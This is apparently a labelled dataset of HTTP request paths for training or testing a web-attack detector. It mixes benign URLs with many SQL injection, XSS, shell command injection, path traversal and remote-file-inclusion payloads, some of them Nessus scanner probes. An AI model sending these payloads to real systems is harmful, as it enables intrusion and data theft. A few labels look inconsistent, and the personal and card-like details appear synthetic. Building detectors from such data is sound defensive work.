request	label
"/ edzaia0i . html ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ ecs_geforce6100sm / 	0
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo hsrgrg )   &  &  str1 =  $  {  # str }   &  &   [  4 -eq  $  { str1 }   ]   &  &  sleep 1  | 	1
/ aa830641 / 	0
/ string / strings / parameters = -3846 %  '  or 6872 = 6872 and  '  %  '  =  ' 	1
/ jeremy_siek / 	0
/ scripts / sawmill6cl . exe ? ho +  { complete_version } 	1
/ v_131088 / 	0
/ javascript / oauth . exe 	1
/ examples / jsp / checkbox / modules . php ? name = my_egallery 	0
/ string / strings / parameters = 87252388w 	0
/ script / ident / disconnect . php ? path_inc = xxpathxx 	1
/ string / strings / parameters = 1 %  '  )  ;  ( select  *  from  ( select ( sleep ( 5 )  )  ) acdk )  # 	1
/ string / strings / parameters = 00090113e 	0
/ tukodz3j . cfc ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / strings / parameters = heidemann @ ppmanzanares . cg 	0
/ test_45 / 	0
/ javascript / category . exe 	1
/ researchbuz03-20 / 	0
/ string / strings / parameters = -6165 %  '  )  )  union all select 5384 # 	1
/ string / strings / parameters = < style >  *  [  {  }  @ import '  %  ( css ) s ?  ]  <  / style > x 	1
/ logo-lev2 / 	0
/ trblogs / 	0
/ javascript / smiles . pm 	0
/ string / strings / parameters = 4129 	0
/ string / strings / parameters = 1 )  )  )  rlike sleep ( 5 )  and  (  (  ( 6790 = 6790 	1
"/ en-us / 33y9gcqq . do ?  < script > document . cookie =  "" testnvxc = 4301 ;  ""  <  / script > "	1
/ string / modo = entrar & login =  |  & pwd = caprifolicea & remember = on & b1 = entrar 	1
"/ string / strings / parameters = < animation xlink : href =  "" data : text / xml ,  < svg xmlns =  ' http :  /  / www . w3 . org / 2000 / svg '  onload =  ' alert ( 88 )  '  >  <  / svg >  ""  /  > "	1
/ auraview / 	0
/ examples / jsp / colors / man-cgi ? section = 0 & topic = ls ; id 	1
/ nm0000905 / 	0
/ string / strings / parameters = itter 	0
/ main . php ? stuff =  ; sleep \ x099 \ x09 # 	1
/ string / strings / parameters = -2500 '  )  )  )  union all select 6853 , 6853 , 6853 , 6853 -- 	1
/ ftopic16956 / 	0
/ dir_phnntp / article-raw . php ? file_newsportal = xxpathxx ? 	1
/ javascript / build . jar 	0
/ javascript / styles . save 	0
/ string / strings / parameters = gastoni @ stainless . iq 	0
"/ phpmyadminsearch-results . dot ? search_query = nessus ""  >  < script > alert (  ' dotcms_search_query_xss . nasl '  )  <  / script >  / "	1
/ string / strings / parameters = . excretoria 	0
/ string / strings / parameters = bascuana de san pedro 	0
/ index_177 / 	0
/ string / strings / parameters = 1 '  and extractvalue ( 7982 , concat ( 0x5c , 0x7171706a71 ,  ( select  ( elt ( 7982 = 7982 , 1 )  )  )  , 0x717a767a71 )  )  and  ' lgat '  like  ' lgat 	1
/ mabelode / 	0
/ cacti / mail . php ? id =  '  /  *  *  / union /  *  *  / select /  *  *  / 1 , 2 , 1331909423 , 4 --  & blog = 1 	1
/ string / id = 3 & nombre = vino + rioja & precio = 100 & cantidad = 82 ' injected_param & b1 = aadir + al + carrito 	1
/ caspadmin / index . asp 	0
/ 7005386fvr95 / 	0
/ 5 urodziny vol / 	0
/ 156901 / 	0
/ string / id = 2 & nombre = vino + rioja & precio = 85 & cantidad = 56 & b1 = aadir + al + carrito 	0
/ recordings / catalog . php ? action = category_show & id =  ' 	1
/ javascript /  . passwd . xls 	1
/ string / strings / parameters = atractivo 	0
/ string / strings / parameters = eldredge 	0
/ 039023 / 	0
/ fileboxitbutton / 	0
/ phpmyadmin . xslt 	0
/ string / modo = entrar & login = doerksen & pwd = 0a3ramplar & remember = off & b1 = entrar 	0
/ javascript / unregister . mdb 	0
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo gzngde )   &  &  str1 =  $  {  # str }   &  &   [  2 -eq  $  { str1 }   ]   &  &  sleep 1  & 	1
"/ string / strings / parameters = < meta http-equiv = set-cookie content =  "" testyrbs = 2855 ""  > "	1
/ string / modo = registro & login = finnegan & password = c978ca & nombrea = mailena & apellidos = spellmann + calafat & email = henshaw-irish @ ladigianni . ar & dni = 25343220a & direccion = c /  + aurora ,  + 129 +  & ciudad = santa + mara + del + campo & cp = 02290 & provincia = soria & ntc = 8611196070656706 & b1 = registrar 	1
/ 165239 / 	0
/ phpmyadmin / adodb / server . php ? sql =  ' adodb_sql_sql_injection . nasl 	1
/ string / strings / parameters = 3o7za732 	0
/ string / modo = registro & login = duljit & password = regi0ona2 & nombre = rosngela & apellidos = sit + agulla & email = nissen @ hipersevilla . af & dni = 07077546d & direccion = passatge + brancatges ,  + 104 +  & ciudad = granyena + de + segarra & cp = 12527 & provincia = salamanca & ntc = 1026055264847672 & b1 = registrar 	0
/ intsec / 	0
/ string / strings / parameters = -6400 )  )  union all select 4650 , 4650 , 4650 -- 	1
/ learning_difficulties / 	0
/  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  .  .  \  { file } 	1
/ string / strings / parameters = order by 21 # 	1
/ index . php ? mode = http :  /  / 192 . 168 . 202 . 96 : 8080 / 4dckqcc0acprbz ? 	0
/ javascript / eric . xsl 	0
/ 000122985 / 	0
/ prod_updates / 	0
/ msg10917626 / 	0
"/ string / strings / parameters = ""  |   [  9 -ne  $  ( echo cinwsa  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  & "	1
"/ quagynka . cfm ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ pcmcia_ci10147 / 	0
/ marino_and / 	0
/ string / strings / parameters = bellreguard 	0
"/ main . php ? stuff =  ""  ; sleep 8  # "	1
/ examples / jsp / cal / athenareg . php ? pass =   ; id 	1
/ string / strings / parameters = kingslan 	0
/ 000044659 / 	0
/ string / strings / parameters = kostka5 @ institutoandaluzdelmar . an 	0
"/ string / strings / parameters = -3082 ""  ""  )  where 1082 = 1082 or 5023 = ctxsys . drithsx . sn ( 5023 ,  ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 5023 = 5023 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  )  -- "	1
/ javascript / h . aspx 	0
/ 112872222499420794 / 	0
/ string / strings / parameters = 1 )  ; iif ( 5462 = 8866 , 1 , 1 / 0 ) 	1
/ javascript / servers . exe 	1
/ application-hosting / 	0
/ savona / 	0
/ string / strings / parameters = recobracin 	0
/ badge-firstgov / 	0
/ string / strings / parameters = 12064316b 	0
/ scgi-bin / fileseek2 . cgi ? foot =  & head =  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  / etc / passwd 	1
/ string / modo = entrar & login = baskin & pwd = h8r66o & remember = on & b1 = entrar 	0
/ 200731 / 	0
"/ en-us / ddoworrl . aspx ?  < meta http-equiv = set-cookie content =  "" testvlau = 8517 ""  > "	1
/ string / strings / parameters = 6894 	0
/ string / modo = registro & login = erda5 & password = moriego & nombre = iago & apellidos = claros + lafragueta & email = moore @ hotelesymas . ar & dni = 12001090n & direccion = c /  + la + haya ,  + 109 + 13-d & ciudad = corbera + d ' ebre & cp = 10260 & provincia = badajoz & ntc = 3006162765919932 & b1 = registrar 	0
/ cgi-win / texis . exe / junk 	1
/ annual-flowers / 	0
/ uhren-lexikon / 	0
"/ en-us /  < script > document . cookie =  "" testzgnm = 1183 ;  ""  <  / script > "	1
/ 3lewis / 	0
/ string / modo = registro & login = correa & password = 5ortera & nombre = fructuosa & apellidos = polloni + homdedeu & email = berto @ sindualidad . dd & dni = 49742539w & direccion = c /  + einstein ,  + 147 ,  + 9 ? a & ciudad = legazpi & cp = 44349 '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  & provincia = valencia & ntc = 2169388539628734 & b1 = registrar 	1
/ chelsea vs charlton - 2nd half / 	0
/ 127885 / 	0
/ string / strings / parameters = olite 	0
"/ ghswfouu . cfc ?  < script > document . cookie =  "" testsqmm = 5713 ;  ""  <  / script > "	1
/ javascript / sav . ora 	0
/ mabry httpserver x v1 / 	0
"/ hrttz9fj . php3 ?  < meta http-equiv = set-cookie content =  "" testtbjy = 7334 ""  > "	1
/ string / strings / parameters = e906aci9 	0
/ string / strings / parameters = 1927389930428156 	0
/ string / strings / parameters = 229i9967te 	0
/ sm-serversback / 	0
/ en-us / account / simple / view_page ? mv_arg =  | cat  / etc / passwd | 	1
/ 0913217 / 	0
/ cgi-home / texis . exe / junk 	1
/ string / strings / parameters = -8876 '  )  )  or 3038 = 3038 	1
/ string / strings / parameters = '  |   [  6 -ne  $  ( echo jeorxy  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  | 	1
/ 043196 / 	0
/ buzz-boks / 	0
/ javascript / motd . rhtml 	0
/ index . php ? config [ root_ordner ]  = xxpathxx ? cmd = id 	1
/ javascript / party . tar . bz2 	0
/ api_docs / 	0
/ 8054_thumb / 	0
/ string / modo = registro & login = laruffa & password = log9era & nombre = adelmar & apellidos = muoz + birosta & email = bond @ tomorrow . com . hk & dni = 87053274e & direccion = c /  + jose + maria + peman ,  + 113 ,  +  & ciudad = molina + de + aragn & cp = 08518 & provincia = burgos & ntc = 2237912988616662 & b1 = registrar 	0
/ string / strings / parameters = 16646 	0
/ main . php ? logout =  ' uname  > q44999749  # 	1
/ 000032892 / 	0
/ string / strings / parameters = < frameset onload = popup = 1 ;  > 	1
/ string / strings / parameters = collinson_butarinski @ fernandosoto . il 	0
/ string / strings / parameters = kellard @ todobetis . gf 	0
/ string / strings / parameters = calle rocafort ,  169 4c 	0
/ string / strings / parameters = ) print (  ` echo kplwcf \ necho  $  (  ( 96 + 6 )  )  \ necho kplwcf \ necho kplwcf `  )  ;  /  / kplwcf 	1
/ 6212792 / 	0
/ string / strings / parameters = 1 '  or 5286 =  ( select count (  *  )  from all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 )  and  ' aezm '  like  ' aezm 	1
/ armcit / 	0
/ 038627 / 	0
/ help . php ? q = ver \ x0c > q77626753 & rem \ x0c 	1
/ boxers / 	0
/ firegraphic / 	0
/ dma [ 2006-1016a ]  / 	0
/ 2029285420 / 	0
/ string / strings / parameters = ;  str =  $  ( echo ysdkbb )  ;  str1 =  $  {  # str }  ;  if  [  5 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  ' 	1
/ referenzen / 	0
/ string / strings / parameters = |   [  7 -ne  $  ( echo runalc  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  \  \ 	1
/ string / strings / parameters = neetu 	0
/ ies4linux / 	0
/ recordings / index . php ? gadget =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 & path =  / etc 	1
"/ string / strings / parameters = ""  ;  str =  $  ( echo uyjmim )  ;  str1 =  $  {  # str }  ;  if  [  9 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  /  / "	1
"/ tuwjta1w . htm ?  < script > document . cookie =  "" testpokn = 7494 ;  ""  <  / script > "	1
/ string / strings / parameters = 6424 	0
/ string / strings / parameters = 1 )  )  ; call regexp_substring ( repeat ( right ( char ( 3702 )  , 0 )  , 500000000 )  , null )  and  (  ( 4142 = 4142 	1
/ string / modo = entrar & login = durward & pwd = 0 / 45 , ce1 / r & remember = on & b1 = entrar 	1
"/ zuihld5m . idc ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ 205_goearly / 	0
/ examples / jsp / error / base_local_rules . php ? dir =  < script > alert (  ' base_local_rules_xss . nasl-1331904405 '  )  <  / script > 	1
/ javascript / notification . swf 	0
/ string / str =  $  ( echo bthzml )   str1 =  $  {  # str }   if  [  1 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  \  \ 	1
/ string / strings / parameters = alicante 	0
/ mesmall / 	0
/ main . php ? logout =  '  ; uname \ x09 > q16263765 \ x09 # 	1
"/ en-us / i686v90l . idc ?  < script > document . cookie =  "" testfutf = 1550 ;  ""  <  / script > "	1
/ string / strings / parameters = &  & echo $ ifsdfydra $  (  ( 1 + 96 )  )  $  ( echo $ ifsdfydra ) dfydra \  \ 	1
/ string / strings / parameters = 1 and 8407 =  ( select count (  *  )  from generate_series ( 1 , 5000000 )  )  #  tqmr 	1
/ scripts / inc / formmail . inc . php ? script_root =  .  .  / templates / mail . tpl . txt \ x00 	1
/ 145703 / 	0
/ examples / servlets / servlet / pals-cgi ? palsaction = restart & documentname =  / etc / passwd 	1
"/ oie504mr . cfm ?  < script > document . cookie =  "" testtpby = 7052 ;  ""  <  / script > "	1
/ string / strings / parameters = 1 or 9643 =  ( select count (  *  )  from domain . domains as t1 , domain . columns as t2 , domain . tables as t3 ) 	1
/ string / modo = registro & login = carli8 & password = 5im2n507 & nombre = jos + mara & apellidos = vilageli + bonet & email = baylor @ magichobby . sy & dni = 80135662m & direccion = calle + estrella + orion + 190 +  & ciudad = encinillas & cp = 09681 & provincia = zaragoza & ntc = 2558545383527310 & b1 = registrar 	1
/ dl5824 / 	0
/ string / strings / parameters = 5ua5teo 	0
/ tikiwiki / tiki-graph_formula . php ? w = 1 & h = 1 & s = 1 & min = 1 & max = 2 & f [  ]  = x . tan . phpinfo (  )  & t = png & title = http :  /  / 192 . 168 . 202 . 96 : 8080 / 4dckqcc0acprbz ? 	1
/ siddharth02012006 / 	0
/ string / strings / parameters = ftp :  /  / 192 . 168 . 24 . 202 /  *  < apache_mod_proxy_ftp_glob_xss . nasl > 	1
"/ h4bi26jd . php ?  < script > document . cookie =  "" testhrzx = 1150 ;  ""  <  / script > "	1
/ insurers-off / 	0
/ class / php / d4m_ajax_pagenav . php ? globals [ mosconfig_absolute_path ]  = http :  /  / 192 . 168 . 202 . 118 : 8080 / iroy1gvqrrqu ? 	0
"/ string / strings / parameters = | echo mavzwg $  (  ( 0 + 81 )  )  $  ( echo mavzwg ) mavzwg "" "	1
/ help . php ? q =  '  \ x0auname  > q83228487  # 	1
/ string / strings / parameters = < html >  < body > 	1
/ string / strings / parameters = '  &  & echo kbsbea $  (  ( 42 + 79 )  )  $  ( echo kbsbea ) kbsbea /  / 	1
/ xcolumns_v1 / 	0
/ string / strings / parameters = arceo feliu 	0
/ string / strings / parameters = casacuberta delacerda 	0
"/ en-us / oie504mr . nsf ?  < meta http-equiv = set-cookie content =  "" testtpby = 7052 ""  > "	1
/ string / modo = registro & login = stefanac & password = autointoxicacin & nombre = eudoro & apellidos = valderrbano & email = marleau @ rosaserigrafia . nz & dni = 08475533x & direcciona = pl .  + elio + antonio + de + nebrija ,  + 34 +  & ciudad = santa + mara + del + cubillo & cp = 43740 & provincia = guadalajara & ntc = 3535089372971785 & b1 = registrar 	1
/ string / modo = entrar & login =  +  & pwd = antagallar & remember = off & b1 = entrar 	1
"/ d44uk9h2 . kspx ?  < meta http-equiv = set-cookie content =  "" testmybc = 2088 ""  > "	1
/ string / strings / parameters = calle juan sitges 2 	0
/ string / strings / parameters = barrutia marsany 	0
/ reg . htm 	0
/ examples / servlets / servlet / shared / help . php ? page =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 	1
/ string / strings / parameters = 1 '  )  )  ; select count (  *  )  from generate_series ( 1 , 5000000 )  -- 	1
/ javascript / wwwuser . exe 	1
"/ main . php ? logout =  "" ping \ xa0-w \ xa07000 \ xa0-n \ xa01 \ xa01 . 2 . 3 . 4 | rem \ xa0 "	1
/ string / modo = entrar & login = valcourt & pwd = pavor & remember = off & b1 = entrar 	0
/ 154042 / 	0
"/ 8t9v8k7x . cfc ?  < script > document . cookie =  "" testhvje = 9403 ;  ""  <  / script > "	1
/ string / modo = registro & login = ochoa7 & password = 7a13 & nombre = danisa & apellidos = altares + pellizza & email = larguey @ erasmusrooms . qa & dni = 26707809w & direccion = pl .  + espaa ,  + 108 ,  + 13 ? a & ciudad = alcarrs & cp = 15618 & provincia = valencia & ntc = 3358050293817980 & b1 = registrar 	0
/ monitory-lcd / 	0
/ zmvq66jy . htm ?  < script > cross_site_scripting . nasl <  / script > 	1
/ 81_tony ' s amateur tapes-5 / 	1
/ tonycubed / 	0
/ string / strings / parameters = 34844 	0
/ examples / jsp / colors / direct . php ? rf =  / etc / passwd \ x00 	1
/ javascript / closing . cc 	0
"/ top . php ? stuff =  "" ping , -w , 10000 , -n , 1 , 4 . 3 . 2 . 1 | rem , "	1
"/ main . php ? logout =  ""  \ x0asleep \ x097 \ x09 # "	1
/ hitch10 / 	0
/ photo_exif / 	0
/ 102243 / 	0
/ string / strings / parameters = bailn 	0
/ string / strings / parameters = farran ferragut 	0
/ ref010701 / 	0
/ javascript / program . exe 	1
/ string / strings / parameters = 37167690n 	0
"/ string / strings / parameters = ""  --  >  <  / style >  <  / script >  < script > 0x94 ( 0x000123 )  < "	1
/ info_2089 / 	0
/ 20040610-53 / 	0
/ 20060922-4 / 	0
/ searchpromotionlogo / 	0
/ string / strings / parameters = 4610658579626439 	0
/ toystory_1 / 	0
"/ string / strings / parameters = '  select dbms_xmlgen . getxml (  ' select  \  "" a \  ""  from sys . dual '  )  from sys . dual ; "	1
/ candle_logo / 	0
/ cgi-perl / sensepost . exe ?  / c + dir 	1
/ string / strings / parameters = c /  salvador 64 ,  5c 	0
/ string / strings / parameters = 1 '  )  )  as dcen where 5852 = 5852 or  ( select  *  from  ( select ( sleep ( 5 )  )  ) ydpu )  -- 	1
/ mzmymda1 / 	0
/ faqs_product / 	0
/ ra puzz loop v1 / 	0
/ 2ffba4cde226b5 / 	0
"/ string / strings / parameters = < script > document . cookie =  "" testsqmm = 5713 ;  ""  <  / script > "	1
/ string / strings / parameters = '  ;  str =  $  ( echo ooyllh )  ;  str1 =  $  {  # str }  ;  if  [  2 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  ' 	1
/ string / modo = insertar & precio = 8360 & b1 = pasar + por + caja / 	1
/ string / strings / parameters = jasmann 	0
/ javascript / webmail . exe 	1
/ top . php ? header =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ index-2x1 / 	0
/ string / modo = registro & login = yigal & password = anf6_9ti4915 & nombre = sharim & apellidos = grino + crosas & email = santacroce_prueckner @ puravidasa . bn & dni = 68875056s & direccion = c /  + padre + presentat ,  + 26 +  & ciudada = torremanzanas / torre + de + les + maanes ,  + la & cp = 31750 & provincia = vila & ntc = 7191364141648176 & b1 = registrar 	1
/ admin / cp . cfm 	0
/ string / strings / parameters = 7677 	0
/ string / strings / parameters = snedeker 	0
/ get_quote / 	0
/ string / strings / parameters = pobladura de pelayo garca 	0
/ land of oz 2 / 	0
/ javascript / vendors . csv 	0
/ 0764575910-1 / 	0
/ j4drbkil . htm ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / modo = registro @ 40 & login = tech4 & password = mosqui-tero & nombre = rendor & apellidos = sennacherribbo + castelan & email = peake @ devuelos . mx & dni = 32201886t & direccion = carretera + general + de + la + laguna ,  + 39 + 3 ? d & ciudad = aldeanueva + del + camino & cp = 09143 & provincia = segovia & ntc = 8941990711802525 & b1 = registrar 	1
/ clingy / 	0
"/ string / strings / parameters = 1 ""  ""  )  )  )  ; select count (  *  )  from generate_series ( 1 , 5000000 )  and  (  (  (  ""  "" wdbg ""  ""  like  ""  "" wdbg "	1
/ string / strings / parameters = 0887551084770656 	0
/ exotics / 	0
"/ string / strings / parameters = < pre style = line-height : 1 >  < script > d = document ; for ( i = 1 ; i < 4001 ; i +  +  )  { d . write ( math . random (  )  <  . 5 ?  ""  \ u2571 ""  :  ""  \ u2572 ""  )  ; d . write ( i ?  ""  ""  :  ""  \ n ""  )  }  <  / script > "	1
/ string / strings / parameters = c /  alcalde gabriel mejias pombo 121 6-f 	0
"/ string / strings / parameters = -1 < table >  < td background =  ""  "" javascript : document . cookie = true ;  ""  ""  > "	1
/ natnoc-20 / 	0
/ string / strings / parameters = ostyn . martan @ icodea . lu 	0
/ bsilix_path ]  / files / mbox-action . php3 ? bsx_libdir = xxpathxx 	1
/ roman_curia / 	0
/ string / strings / parameters = 30736152x 	0
"/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo bfmcie )   &  &  str1 =  $  {  # str }   &  &   [  3 -eq  $  { str1 }   ]   &  &  sleep 1  "" "	1
"/ fmnveedu . aspx ?  < script > document . cookie =  "" testgfbr = 7014 ;  ""  <  / script > "	1
/ string / strings / parameters = ichizen 	0
"/ examples / jsp / jsp2 / el / server . pt ? open = space & name =  ""  ;  }  <  / script >  < script > alert (  ' plumtree_name_xss . nasl '  )  <  / script > "	1
/ javascript / menu . doc 	0
/  < script > cross_site_scripting . nasl <  / script >  . do 	1
/ jm_getorg / 	0
/ string / strings / parameters = cecile 	0
/ 20061005-8 / 	0
/ javascript / adv . pl 	0
/ atozlist_560 / 	0
/ string / modo = registro & login = babatund & password = pa6omer9-a & nombre = juana + del + pilar & apellidos = luna + barberan & email = mazurowna @ wdsl . om & dni = 19546963e & direccion = villadangos + del + paramo ,  + 82 ,  +  & ciudad = encinas + de + esgueva & cp = 10830 & provincia = barce + lon ?  / a & ntc = 5365738910346806 & b1 = registrar 	1
/ string / modo = registro & login = hews & password = p1s9do & nombre = karem & apellidos = rochas + comamala & email = mccollum . hemsley @ cursosdele . bg & dni = 59529079l & direccion = avda .  + infante + don + jaime ,  + 133 ,  +  & ciudad = villavaquern & cp = 09259 & provincia = ourense & ntc = 0480040277538329 & b1 = registrar 	0
/ sinksub / 	0
/ fid172872d14d79337f1cece62437421c2067bc20b8 / 	0
/ string / strings / parameters = calle pea de francia ,  5 	0
/ string / strings / parameters = -5229 '  )  )  as tkqp where 9253 = 9253 or 9323 = 9323 # 	1
"/ examples / servlets / servlet / user . cgi ? url =  ""  >  < script > alert (  "" gossamer_links_url_xss . nasl ""  )  ;  <  / script >  & from = add "	1
/ javascript / f . zip 	0
/ 128197 / 	0
"/ string / strings / parameters = 1 ""  ""  where 9241 = 9241 union all select null # "	1
"/ main . php ? stuff =  ""  & sleep \ x0910 \ x09 # "	1
/ javascript / pixel . temp 	0
/ report2004 / 	0
/ javascript / logins . exe 	1
/ alexandre o grande dvd1by kuro yume / 	0
/ partnerfaq / 	0
/ string / strings / parameters = '  |   [  2 -ne  $  ( echo rlzfde  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  # 	1
"/ help . php ? q =  ""  & ping \ x0b-w \ x0b11000 \ x0b-n \ x0b1 \ x0b1 . 2 . 3 . 4 & rem \ x0b "	1
/ string / strings / parameters = echo $ ifsnwialt $  (  ( 43 + 48 )  )  $  ( echo $ ifsnwialt ) nwialt & 	1
/ 03males / 	0
/ string / strings / parameters = 1 %  '  )  )  )  ; begin dbms_lock . sleep ( 5 )  ;  end -- 	1
/ es2ca62a5749 / 	0
/ string / strings / parameters = 99997973e 	0
"/ string / strings / parameters = & lt ; img src =  \  "" http &  # 58 ;  /  / www &  # 46 ; thesiteyouareon &  # 46 ; com / somecommand &  # 46 ; php ? somevariables = maliciouscode \  ""  & gt ; "	1
"/ string / strings / parameters = 1 ""  ""  and 6537 = dbms_pipe . receive_message ( chr ( 76 )  |  | chr ( 116 )  |  | chr ( 117 )  |  | chr ( 65 )  , 5 )  and  ""  "" kfps ""  ""  =  ""  "" kfps "	1
/ javascript / pub . asp 	0
/ buffwing / 	0
/ get_advice / 	0
/ wmafrica / 	0
/ javascript / ms-sql . html 	0
/ string / strings / parameters = azmeena 	0
/ 121806j1 / 	0
/ show_messages / 	0
/ string / strings / parameters = 08282 	0
/ string / strings / parameters = bloc bic ,  s / n ,  12c 	0
/ article3099544 / 	0
/ javascript / zipfiles . rtf 	0
/ 091430 / 	0
/ javascript / sh . aspx 	0
/ string / strings / parameters = 1 '  &  & 1 =  ' 1 	1
"/ en-us / 33y9gcqq . kspx ?  < meta http-equiv = set-cookie content =  "" testnvxc = 4301 ""  > "	1
/ lego_dishwasher / 	0
"/ main . php ? stuff =  "" ver & rem \ x09 "	1
/ string / strings / parameters = 3553 	0
/ www_bget / 	0
/ productcd-078212741x / 	0
/ 6170070 / 	0
/ string / modo = insertar & precio = 2191 & b1 = pasar + por + caja 	0
/ crypto-appl / 	0
"/ string / strings / parameters = '  ; alert ( string . fromcharcode ( 88 , 83 , 83 )  )  /  /  '  ; alert ( string . fromcharcode ( 88 , 83 , 83 )  )  /  /  ""  ; "	1
/ home_video / 	0
/ cybergirls / 	0
/ string / strings / parameters = 1 '  )  )  )  or 6793 =  ( select 6793 from pg_sleep ( 5 )  )  and  (  (  (  ' mzqi '  =  ' mzqi 	1
/ string / strings / parameters = -2129 '  )  or 2724 in  (  ( char ( 113 )  + char ( 113 )  + char ( 112 )  + char ( 106 )  + char ( 113 )  +  ( select  ( case when  ( 2724 = 2724 )  then char ( 49 )  else char ( 48 )  end )  )  + char ( 113 )  + char ( 122 )  + char ( 118 )  + char ( 122 )  + char ( 113 )  )  )  and  (  ' eutm '  like  ' eutm 	1
/ javascript /  ~ ftp . class 	0
/ javascript / day . exe 	1
/ su-jine_banner / 	0
"/ qczkquis . cgi ?  < script > document . cookie =  "" testkwlg = 5591 ;  ""  <  / script > "	1
/ mju2mdiy / 	0
/ 000073064 / 	0
/ 256550 / 	0
/ entschliessungssammlung / 	0
/ string / strings / parameters = 3006162765919932 	0
/ core / aural . php ? site_absolute_path = http :  /  / 192 . 168 . 202 . 96 : 8080 / txenjrxf3 ?  ?  & cmd = dir 	0
/ ib1002_00034 / 	0
/ cgi-win / pfdispaly . cgi ?  '  \ x0a / bin / cat  / etc / passwd |  ' 	1
/ static /  /  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  . windows / win . ini 	1
/ javascript / showmap . key 	0
/ awzmb / adminhelp . php ? setting [ opt_includepath ]  = xxpathxx 	1
"/ top . php ? stuff =  ""  \ x0duname  > q38313114  # "	1
/ cgi-local / a1stats / a1disp3 . cgi ?  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ string / strings / parameters = escultor damian forment 128 11 ? g 	0
/ hard59 / 	0
/ index_company / 	0
/ string / strings / parameters = c /  afluente ,  82 	0
/ en-us / account / showcat . php ? cat = 1 ' 	1
/ string / strings / parameters = 6922 	0
/ string / strings / parameters = c /  francisco rodriguez 48 	0
/ string / modo = registro & login = jobyna & password = cab5254a & nombre = amru & apellidos = membrives + larragoiti & email = tandy-thate @ viscotek . rs & dni = 16093683p & direccion = c /  + lucentum + 86 +  & ciudad = casp ? e & cp = 25400 & provincia = segovia & ntc = 2519318826209754 & b1 = registrar 	1
/ enrd-home / 	0
/ string / strings / parameters = ibazeta montells 	0
"/ n9xlumt5 . do ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ string / strings / parameters = -8301 '  )  )  )  or  ( 5708 = 5268 )  * 5268 and  (  (  (  ' hkha '  =  ' hkha 	1
